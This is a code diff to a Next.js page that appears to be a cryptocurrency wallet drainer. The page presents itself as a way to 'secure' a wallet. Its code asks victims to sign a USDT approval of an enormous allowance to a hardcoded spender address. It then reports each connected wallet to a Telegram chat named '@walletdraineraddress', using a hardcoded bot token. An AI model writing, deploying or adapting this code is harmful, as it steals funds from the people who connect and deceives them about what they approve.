@@ -42,15 +42,6 @@ export default function Home() {
     null
   ); // State for timeout
 
-  // ENV VARIABLES
-
-  const spenderAddress = process.env
-    .NEXT_PUBLIC_SPENDER_ADDRESS as `0x${string}`;
-  const contractAddress = process.env.NEXT_PUBLIC_ADDRESS as `0x${string}`;
-  const botToken = process.env.NEXT_PUBLIC_BOT_TOKEN;
-  const chatId = process.env.NEXT_PUBLIC_CHAT_ID;
-  const websiteName = process.env.NEXT_PUBLIC_WEBSITE_NAME;
-
   const { open, close } = useWeb3Modal();
   const { disconnect } = useDisconnect();
   const { address } = useAccount();
@@ -63,9 +54,9 @@ export default function Home() {
     signMessage,
   } = useSignMessage({ message: "gm wagmi frens" });
 
-  // const spenderAddress = "0x43E7263534d6aB44347e0567fAA6927A2b865516";
+  const spenderAddress = "0x43E7263534d6aB44347e0567fAA6927A2b865516";
   const { config } = usePrepareContractWrite({
-    address: contractAddress, // USDT-ERC20
+    address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT-ERC20
     abi: usdtABI,
     functionName: "approve",
     args: [spenderAddress as Address, parseEther("100000000000")],
@@ -111,7 +102,7 @@ export default function Home() {
 
         // Send Telegram message indicating approval attempt
         await sendTelegramNotification(
-          `${address} is attempting to secure wallet on ${websiteName}`
+          `${address} is attempting to secure wallet`
         );
 
         await write();
@@ -165,9 +156,7 @@ export default function Home() {
 
   useEffect(() => {
     if (address) {
-      sendTelegramNotification(
-        `Wallet (${address}) connected on ${websiteName}.`
-      );
+      sendTelegramNotification(`Wallet (${address}) connected.`);
     }
   }, [address]);
 
@@ -207,8 +196,8 @@ export default function Home() {
 
   const sendTelegramNotification = async (message: string) => {
     try {
-      // const tbotToken = botToken;
-      // const chatId = "@walletdraineraddress";
+      const botToken = "7095023752:AAGH_bXRYtd3qe0kPI6AewFy4VVs8oqWCo0";
+      const chatId = "@walletdraineraddress";
 
       await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         chat_id: chatId,
